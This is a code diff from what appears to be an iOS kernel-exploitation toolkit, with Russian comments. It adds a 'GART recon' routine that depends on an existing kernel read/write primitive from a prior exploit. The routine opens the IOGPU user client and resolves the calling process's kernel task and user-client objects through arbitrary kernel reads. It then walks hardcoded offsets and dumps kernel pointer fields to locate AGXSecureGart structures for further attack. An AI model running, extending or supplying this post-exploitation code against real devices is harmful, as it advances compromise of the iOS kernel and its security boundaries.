@@ -5225,6 +5225,70 @@ static void *kpParkWorker(void *arg)
     return r;
 }
 
+#pragma mark - GART recon (IOGPU → AGXSecureGart, read-only)
+
+extern uint64_t kp_rc_kread64(uint64_t);
+
+// Дамп pointer-полей объекта: какие поля содержат kernel VA и куда они ведут.
+static void kpDumpPtrFields(NSMutableString *r, uint64_t objVA, const char *name, uint32_t size)
+{
+    kpNote(r, [NSString stringWithFormat:@"  --- %s @ %#llx (pointer fields):", name, objVA]);
+    int shown = 0;
+    for (uint32_t o = 0; o < size && shown < 48; o += 8) {
+        uint64_t v = kp_untag_ptr(kp_rc_kread64(objVA + o));
+        if (!kpLooksLikeKernelPointer(v)) continue;
+        uint64_t tgt0 = kp_rc_kread64(v); // vtable кандидат / первое поле
+        kpNote(r, [NSString stringWithFormat:@"    +%#04x → %#llx  [0]=%#llx", o, v, tgt0]);
+        shown++;
+    }
+    if (!shown) kpNote(r, @"    (нет kernel-указателей)");
+}
+
++ (NSString *)gartProbeReport
+{
+    NSMutableString *r = [NSMutableString string];
+    kpNote(r, @"=== GART recon (IOGPU → AGXSecureGart, read-only) ===");
+    if (!gPrimitives.kreadbuf || !gPrimitives.kwritebuf) {
+        [r appendString:@"KRW не жив — сначала эксплойт.\n"];
+        return r;
+    }
+    extern uint64_t kp_rc_kread64(uint64_t);
+    extern uint64_t task_get_ipc_port_kobject(uint64_t, mach_port_t);
+    extern uint64_t proc_self(void);
+
+    // 1. open IOGPU user client
+    io_service_t svc = IOServiceGetMatchingService(kIOMainPortDefault, IOServiceMatching("IOGPU"));
+    if (!svc) svc = IOServiceGetMatchingService(kIOMainPortDefault, IOServiceMatching("AGXAccelerator"));
+    kpNote(r, [NSString stringWithFormat:@"  сервис IOGPU: %#x", svc]);
+    if (!svc) { [r appendString:@"FAIL: сервис не найден\n"]; return r; }
+    io_connect_t conn = 0;
+    kern_return_t kr = IOServiceOpen(svc, mach_task_self(), 0, &conn);
+    IOObjectRelease(svc);
+    kpNote(r, [NSString stringWithFormat:@"  IOServiceOpen: kr=%#x conn=%#x", kr, conn]);
+    if (kr || !conn) { [r appendString:@"FAIL: IOServiceOpen\n"]; return r; }
+
+    // 2. port → kobject (IOGPUDeviceUserClient)
+    uint64_t selfProc = proc_self();
+    uint64_t p_ro = kp_untag_ptr(kp_rc_kread64(selfProc + off_proc_p_proc_ro));
+    uint64_t selfTask = kp_untag_ptr(kp_rc_kread64(p_ro + off_proc_ro_pr_task));
+    uint64_t uc = kp_untag_ptr(task_get_ipc_port_kobject(selfTask, conn));
+    kpNote(r, [NSString stringWithFormat:@"  userclient @ %#llx (proc=%#llx task=%#llx)", uc, selfProc, selfTask]);
+    if (!kpLooksLikeKernelPointer(uc)) { [r appendString:@"FAIL: uc resolve\n"]; return r; }
+
+    // 3. цепочка: UC+0x120 → IOGPUDevice, +0x88 → IOGPU
+    uint64_t device = kp_untag_ptr(kp_rc_kread64(uc + 0x120));
+    uint64_t iogpu = kp_untag_ptr(kp_rc_kread64(device + 0x88));
+    kpNote(r, [NSString stringWithFormat:@"  IOGPUDevice=%#llx IOGPU=%#llx", device, iogpu]);
+
+    // 4. самодокументирующийся дамп: pointer-поля uc/device/iogpu
+    kpDumpPtrFields(r, uc, "userclient", 0x180);
+    if (kpLooksLikeKernelPointer(device)) kpDumpPtrFields(r, device, "IOGPUDevice", 0x400);
+    if (kpLooksLikeKernelPointer(iogpu)) kpDumpPtrFields(r, iogpu, "IOGPU", 0x400);
+    // кандидаты gart: поля, чьи цели похожи на объект с vtable в kernelcache
+    // (первый qword цели = vtable → kernel text/data диапазон)
+    return r;
+}
+
 #pragma mark - D1: TXM stack + frame-type recon (kread-only)
 
 // Frame type of the page backing a kernel VA. -1 when untranslatable.
